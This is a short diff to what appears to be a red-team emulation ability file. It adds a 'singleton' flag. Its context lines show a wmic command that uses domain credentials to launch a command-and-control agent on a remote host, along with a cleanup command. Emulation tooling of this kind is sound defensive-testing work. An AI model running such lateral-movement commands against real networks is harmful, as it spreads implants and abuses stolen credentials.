@@ -14,6 +14,7 @@
           wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "powershell.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}";
         cleanup: |
           wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "taskkill /f /im s4ndc4t.exe"
+  singleton: True
   requirements:
     - plugins.stockpile.app.requirements.basic:
       - source: domain.user.name
